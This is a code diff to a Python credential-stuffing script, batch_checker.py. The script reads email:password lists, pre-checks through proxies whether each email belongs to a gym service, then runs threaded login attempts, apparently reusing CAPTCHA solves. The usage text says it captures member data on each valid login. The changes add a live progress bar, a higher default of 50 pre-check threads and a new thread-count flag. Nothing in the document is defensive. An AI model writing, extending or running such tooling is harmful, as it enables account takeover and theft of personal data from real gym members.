@@ -100,17 +100,27 @@ def load_credentials(path):
     return creds
 
 
-PRE_CHECK_THREADS = int(os.environ.get("PRE_CHECK_THREADS", "10"))
+def _progress_bar(current, total, members, errors, elapsed, width=40):
+    pct = current / total if total else 1
+    filled = int(width * pct)
+    bar = "█" * filled + "░" * (width - filled)
+    rate = current / elapsed if elapsed > 0 else 0
+    eta = (total - current) / rate if rate > 0 else 0
+    sys.stdout.write(
+        f"\r  [{bar}] {current}/{total} ({pct*100:.0f}%) "
+        f"| {members} members | {errors} err | {rate:.0f}/s | ETA {eta:.0f}s  "
+    )
+    sys.stdout.flush()
 
 
-def pre_check_batch(creds, workers=None):
-    workers = workers or PRE_CHECK_THREADS
+def pre_check_batch(creds, workers=50):
     total = len(creds)
-    _log(f"Pre-checking {total} emails for gym membership ({workers} threads)...")
+    print(f"\n  Pre-checking {total} emails ({workers} threads)")
+    print(f"  {'='*56}")
     t0 = time.time()
     results = {}
     lock = threading.Lock()
-    done = [0]
+    counters = {"done": 0, "members": 0, "errors": 0}
 
     def check_one(item):
         email, _ = item
@@ -118,21 +128,26 @@ def pre_check_batch(creds, workers=None):
         is_member = pre_check_email(email, proxy_url)
         with lock:
             results[email] = is_member
-            done[0] += 1
-            if done[0] % 100 == 0 or done[0] == total:
-                n_m = sum(1 for v in results.values() if v is True)
-                _log(f"  Pre-check progress: {done[0]}/{total} ({n_m} members found)")
+            counters["done"] += 1
+            if is_member is True:
+                counters["members"] += 1
+            elif is_member is None:
+                counters["errors"] += 1
+            _progress_bar(counters["done"], total, counters["members"],
+                          counters["errors"], time.time() - t0)
 
     with ThreadPoolExecutor(max_workers=workers) as pool:
         pool.map(check_one, creds)
+
+    print()
 
     members = [(e, p) for e, p in creds if results.get(e) is True]
     non_members = [(e, p) for e, p in creds if results.get(e) is False]
     errors = [(e, p) for e, p in creds if results.get(e) is None]
 
     dt = time.time() - t0
-    _log(f"Pre-check done in {dt:.1f}s: {len(members)} members, "
-         f"{len(non_members)} not members, {len(errors)} errors")
+    print(f"  Done in {dt:.1f}s: {len(members)} members, "
+          f"{len(non_members)} not members, {len(errors)} errors\n")
 
     return members, non_members, errors
 
@@ -170,11 +185,11 @@ def worker(wid, batch, results_lock, results, capture=True):
         cleanup_session(ctx)
 
 
-def batch_check(creds, workers=10, do_precheck=True, do_capture=True):
+def batch_check(creds, workers=10, do_precheck=True, do_capture=True, precheck_threads=50):
     t_total_start = time.time()
 
     if do_precheck:
-        members, non_members, check_errors = pre_check_batch(creds)
+        members, non_members, check_errors = pre_check_batch(creds, workers=precheck_threads)
         if not members:
             _log("No gym members found, nothing to check")
             return []
@@ -247,24 +262,30 @@ def batch_check(creds, workers=10, do_precheck=True, do_capture=True):
 
 if __name__ == "__main__":
     args = [a for a in sys.argv[1:] if not a.startswith("--")]
-    flags = [a for a in sys.argv[1:] if a.startswith("--")]
+    flags = {f.split("=")[0]: f.split("=")[1] if "=" in f else True
+             for f in sys.argv[1:] if f.startswith("--")}
 
     if not args:
-        print("Usage: python batch_checker.py <creds_file> [workers] [--no-precheck] [--no-capture]")
+        print("Usage: python batch_checker.py <creds_file> [workers] [flags]")
         print("  creds_file: one email:password per line")
+        print(f"  workers: concurrent solve workers (default: 10)")
         print(f"  Each solve is reused for {REUSE_LIMIT} credential checks")
-        print("  --no-precheck: skip gym membership pre-check")
-        print("  --no-capture: skip member data capture on valid login")
+        print("\nFlags:")
+        print("  --no-precheck           skip gym membership pre-check")
+        print("  --no-capture            skip member data capture on valid login")
+        print("  --precheck-threads=N    pre-check threads (default: 50)")
         sys.exit(1)
 
     creds_file = args[0]
     workers = int(args[1]) if len(args) > 1 else 10
     do_precheck = "--no-precheck" not in flags
     do_capture = "--no-capture" not in flags
+    precheck_threads = int(flags.get("--precheck-threads", 50))
 
     creds = load_credentials(creds_file)
     if not creds:
         print("No credentials found in file")
         sys.exit(1)
 
-    batch_check(creds, workers, do_precheck=do_precheck, do_capture=do_capture)
+    batch_check(creds, workers, do_precheck=do_precheck, do_capture=do_capture,
+                precheck_threads=precheck_threads)
